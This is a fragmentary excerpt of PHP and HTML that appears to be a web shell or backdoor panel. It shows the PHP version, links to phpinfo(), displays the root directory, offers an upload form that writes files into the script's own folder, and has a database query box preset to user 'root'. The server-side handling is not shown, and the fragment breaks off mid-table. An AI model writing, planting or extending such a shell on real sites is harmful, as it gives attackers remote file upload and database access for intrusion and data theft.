...
echo PHP_VERSION;
?>&nbsp;&nbsp;&nbsp;
        <a href="?phpinfo=true">View phpinfo()
        </a>
      </i>
      <br />
      <i> Root Directory: 
...
?>
  ...
  <div>
    UPLOAD FILE: (THE FILE WILL GET UPLOADED AT 
    <?php
echo basename(__DIR__);
?>) 
    <form action="" method="POST" enctype="multipart/form-data">
      <input type="file" name="fl">
      <input type="submit" name="bup" value="Go">
    </form>
  </div>
  <hr /> 
  <div>
    ...
    <form action="" METHOD="GET">
      <table>
        ...
        <tr>
          ...
          <td>
            <input type="text" name="usr" value="root">
          </td>
        </tr>
        <tr>
          <td>password
        ...
        <tr>
          ...
          <td>
            <textarea name="mquery" rows="6" cols="65">
            </textarea>
          </td>
        </tr>
        <tr>
